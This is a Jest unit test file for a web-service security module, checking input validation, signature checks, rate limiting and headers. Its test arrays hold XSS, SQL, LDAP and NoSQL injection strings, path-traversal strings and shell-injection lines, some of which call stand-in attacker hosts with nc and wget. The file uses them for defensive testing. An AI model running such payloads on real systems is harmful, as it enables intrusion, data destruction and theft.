/**
 * Security Module Unit Tests
 * Comprehensive test suite for security input validation boundaries and edge cases
 */

import { jest } from '@jest/globals';

// Mock crypto module - fix the import issue
jest.unstable_mockModule('crypto', () => ({
  createHmac: jest.fn(() => ({
    update: jest.fn().mockReturnThis(),
    digest: jest.fn(() => 'mock-signature')
  })),
  randomBytes: jest.fn(() => Buffer.from('mock-random-bytes')),
  timingSafeEqual: jest.fn(() => true),
  createHash: jest.fn(() => ({
    update: jest.fn().mockReturnThis(),
    digest: jest.fn(() => 'mock-hash')
  }))
}));

// Import after mocking
const { Security } = await import('../../src/security.js');
const crypto = await import('crypto');

describe('Security', () => {
  let security;

  beforeEach(() => {
    jest.clearAllMocks();
    security = new Security();
  });

  // Add proper cleanup
  afterAll(async () => {
    if (security && typeof security.cleanup === 'function') {
      await security.cleanup();
    }
  });

  describe('Input Validation', () => {
    test('should validate safe strings', () => {
      const safeInputs = [
        'normal text',
        'email@example.com',
        'user123',
        'Simple sentence with spaces.',
        'Numbers 123 and symbols -_.'
      ];

      safeInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(true);
      });
    });

    test('should reject malicious script injections', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("xss")',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)", 0)'
      ];

      maliciousInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should reject SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM passwords --",
        "admin'/*",
        "' OR 1=1#",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "1' OR SLEEP(5)#"
      ];

      sqlInjections.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should reject command injection attempts', () => {
      const commandInjections = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '|| curl malicious.com',
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '; wget malicious.com/shell.sh',
        '| nc attacker.com 4444',
        '; python -c "import os; os.system(\'rm -rf /\')"'
      ];

      commandInjections.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should reject path traversal attempts', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '/etc/passwd%00',
        'file:///etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      pathTraversals.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should handle null and undefined inputs', () => {
      expect(security.validateInput(null)).toBe(false);
      expect(security.validateInput(undefined)).toBe(false);
    });

    test('should handle non-string inputs', () => {
      const nonStringInputs = [
        123,
        true,
        false,
        {},
        [],
        function() {}
      ];

      nonStringInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should respect input length limits', () => {
      const longInput = 'a'.repeat(10000); // Very long input
      expect(security.validateInput(longInput)).toBe(false);

      const normalInput = 'a'.repeat(1000); // Normal length
      expect(security.validateInput(normalInput)).toBe(true);
    });

    test('should handle unicode and encoded inputs', () => {
      const unicodeInputs = [
        '测试中文',
        'тест русский',
        '🚀 emoji test',
        'café',
        'naïve'
      ];

      unicodeInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(true);
      });

      const encodedMalicious = [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;'
      ];

      encodedMalicious.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });
  });

  describe('HMAC Signature Validation', () => {
    test('should generate valid HMAC signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';

      const signature = security.generateSignature(data, secret);

      expect(crypto.createHmac).toHaveBeenCalledWith('sha256', secret);
      expect(signature).toBe('mock-signature');
    });

    test('should validate correct signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';
      const signature = 'mock-signature';

      crypto.timingSafeEqual.mockReturnValue(true);

      const isValid = security.validateSignature(data, signature, secret);

      expect(isValid).toBe(true);
      expect(crypto.timingSafeEqual).toHaveBeenCalled();
    });

    test('should reject invalid signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';
      const signature = 'invalid-signature';

      crypto.timingSafeEqual.mockReturnValue(false);

      const isValid = security.validateSignature(data, signature, secret);

      expect(isValid).toBe(false);
    });

    test('should handle signature validation errors', () => {
      crypto.timingSafeEqual.mockImplementation(() => {
        throw new Error('Signature comparison failed');
      });

      const isValid = security.validateSignature('data', 'sig', 'secret');

      expect(isValid).toBe(false);
    });

    test('should handle empty or null signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';

      expect(security.validateSignature(data, '', secret)).toBe(false);
      expect(security.validateSignature(data, null, secret)).toBe(false);
      expect(security.validateSignature(data, undefined, secret)).toBe(false);
    });
  });

  describe('Rate Limiting', () => {
    test('should create rate limit middleware', () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 10,
        windowMs: 60000
      });

      expect(typeof middleware).toBe('function');
    });

    test('should track request counts by IP', () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 2,
        windowMs: 1000
      });

      const mockReq = { ip: '127.0.0.1' };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request should pass
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();

      // Second request should pass
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalledTimes(2);

      // Third request should be rate limited
      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(429);
    });

    test('should reset rate limit after window expires', async () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 1,
        windowMs: 100 // Very short window
      });

      const mockReq = { ip: '127.0.0.1' };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();

      // Second request should be blocked
      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(429);

      // Wait for window to expire
      await new Promise(resolve => setTimeout(resolve, 150));

      // Third request should pass after window reset
      mockNext.mockClear();
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();
    });

    test('should handle custom key generator', () => {
      const customKeyGenerator = jest.fn(req => `custom-${req.userId}`);

      const middleware = security.rateLimitMiddleware({
        maxRequests: 1,
        windowMs: 1000,
        keyGenerator: customKeyGenerator
      });

      const mockReq = { ip: '127.0.0.1', userId: 'user123' };
      const mockRes = { status: jest.fn().mockReturnThis(), json: jest.fn() };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(customKeyGenerator).toHaveBeenCalledWith(mockReq);
    });
  });

  describe('Security Headers Middleware', () => {
    test('should add security headers', () => {
      const middleware = security.securityHeadersMiddleware();
      const mockReq = {};
      const mockRes = {
        setHeader: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
      expect(mockRes.setHeader).toHaveBeenCalledWith('X-Frame-Options', 'DENY');
      expect(mockRes.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
      expect(mockRes.setHeader).toHaveBeenCalledWith(
        'Strict-Transport-Security',
        'max-age=31536000; includeSubDomains'
      );
      expect(mockNext).toHaveBeenCalled();
    });
  });

  describe('Audit Middleware', () => {
    test('should log request details', () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      const middleware = security.auditMiddleware();

      const mockReq = {
        method: 'POST',
        url: '/api/test',
        ip: '127.0.0.1',
        headers: { 'user-agent': 'test-agent' },
        body: { data: 'test' }
      };
      const mockRes = {};
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(consoleSpy).toHaveBeenCalled();
      expect(mockNext).toHaveBeenCalled();

      consoleSpy.mockRestore();
    });

    test('should detect suspicious patterns', () => {
      const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
      const middleware = security.auditMiddleware();

      const suspiciousReq = {
        method: 'POST',
        url: '/api/test',
        ip: '127.0.0.1',
        headers: { 'user-agent': 'test-agent' },
        body: { data: '<script>alert(1)</script>' }
      };
      const mockRes = {};
      const mockNext = jest.fn();

      middleware(suspiciousReq, mockRes, mockNext);

      expect(consoleSpy).toHaveBeenCalledWith(
        expect.stringContaining('Suspicious request detected')
      );

      consoleSpy.mockRestore();
    });
  });

  describe('Signature Middleware', () => {
    test('should validate request signatures', () => {
      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {
          'x-signature': 'mock-signature',
          'x-timestamp': Date.now().toString()
        },
        body: { data: 'test' },
        rawBody: '{"data":"test"}'
      };
      const mockRes = {};
      const mockNext = jest.fn();

      crypto.timingSafeEqual.mockReturnValue(true);

      middleware(mockReq, mockRes, mockNext);

      expect(mockNext).toHaveBeenCalled();
    });

    test('should reject requests without signatures', () => {
      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {},
        body: { data: 'test' }
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockNext).not.toHaveBeenCalled();
    });

    test('should reject expired timestamps', () => {
      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {
          'x-signature': 'mock-signature',
          'x-timestamp': (Date.now() - 600000).toString() // 10 minutes old
        },
        body: { data: 'test' },
        rawBody: '{"data":"test"}'
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockNext).not.toHaveBeenCalled();
    });
  });

  describe('Content Validation', () => {
    test('should validate JSON content', () => {
      const validJson = '{"key": "value", "number": 123}';
      expect(security.validateJsonContent(validJson)).toBe(true);

      const invalidJson = '{"key": "value", "malicious": "<script>alert(1)</script>"}';
      expect(security.validateJsonContent(invalidJson)).toBe(false);
    });

    test('should detect prototype pollution attempts', () => {
      const pollutionAttempts = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"isAdmin": true}}',
        '{"__proto__.isAdmin": true}'
      ];

      pollutionAttempts.forEach(attempt => {
        expect(security.validateJsonContent(attempt)).toBe(false);
      });
    });

    test('should handle malformed JSON gracefully', () => {
      const malformedJson = '{"key": value}'; // Missing quotes
      expect(security.validateJsonContent(malformedJson)).toBe(false);
    });
  });

  describe('IP Address Validation', () => {
    test('should validate legitimate IP addresses', () => {
      const validIPs = [
        '192.168.1.1',
        '10.0.0.1',
        '172.16.0.1',
        '127.0.0.1',
        '8.8.8.8'
      ];

      validIPs.forEach(ip => {
        expect(security.validateIPAddress(ip)).toBe(true);
      });
    });

    test('should reject suspicious IP patterns', () => {
      const suspiciousIPs = [
        '0.0.0.0',
        '255.255.255.255',
        '127.0.0.1; rm -rf /',
        '192.168.1.1<script>',
        'not.an.ip.address'
      ];

      suspiciousIPs.forEach(ip => {
        expect(security.validateIPAddress(ip)).toBe(false);
      });
    });
  });

  describe('Security Configuration', () => {
    test('should return security status', () => {
      const status = security.getSecurityStatus();

      expect(status).toHaveProperty('enabled');
      expect(status).toHaveProperty('features');
      expect(status.features).toHaveProperty('inputValidation');
      expect(status.features).toHaveProperty('rateLimiting');
      expect(status.features).toHaveProperty('signatureValidation');
    });

    test('should allow security feature configuration', () => {
      security.configure({
        inputValidation: false,
        rateLimiting: true,
        signatureValidation: true
      });

      const status = security.getSecurityStatus();
      expect(status.features.inputValidation).toBe(false);
      expect(status.features.rateLimiting).toBe(true);
    });
  });

  describe('Advanced Threat Detection', () => {
    test('should detect polyglot attacks', () => {
      const polyglotAttacks = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(\'XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//\\x3e',
        '\'"(,;!--<XSS>=&{()}',
        '<svg/onload=alert(String.fromCharCode(88,83,83))>',
        'javascript://\'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*',
        '<img src="x" onerror="javascript:alert(1)">'
      ];

      polyglotAttacks.forEach(attack => {
        expect(security.validateInput(attack)).toBe(false);
      });
    });

    test('should detect LDAP injection attempts', () => {
      const ldapInjections = [
        '*)(uid=*',
        '*)(|(uid=*))',
        '*))(|(uid=*',
        '*))%00',
        '*()|(%26'
      ];

      ldapInjections.forEach(injection => {
        expect(security.validateInput(injection)).toBe(false);
      });
    });

    test('should detect NoSQL injection attempts', () => {
      const nosqlInjections = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
        '{"$gt": ""}',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
      ];

      nosqlInjections.forEach(injection => {
        expect(security.validateJsonContent(injection)).toBe(false);
      });
    });
  });

  describe('Error Handling and Edge Cases', () => {
    test('should handle validation errors gracefully', () => {
      // Mock validation to throw error
      const originalValidate = security.validateInput;
      security.validateInput = jest.fn(() => {
        throw new Error('Validation error');
      });

      expect(() => security.validateInput('test')).toThrow('Validation error');

      // Restore
      security.validateInput = originalValidate;
    });

    test('should handle extremely large inputs', () => {
      const hugeInput = 'x'.repeat(1000000); // 1MB string
      expect(security.validateInput(hugeInput)).toBe(false);
    });

    test('should handle binary data', () => {
      const binaryData = Buffer.from([0x00, 0x01, 0x02, 0x03]).toString();
      expect(security.validateInput(binaryData)).toBe(false);
    });

    test('should handle null bytes', () => {
      const nullByteInputs = [
        'test\x00injection',
        'file.txt\0.exe',
        'query\x00; DROP TABLE users'
      ];

      nullByteInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });
  });
});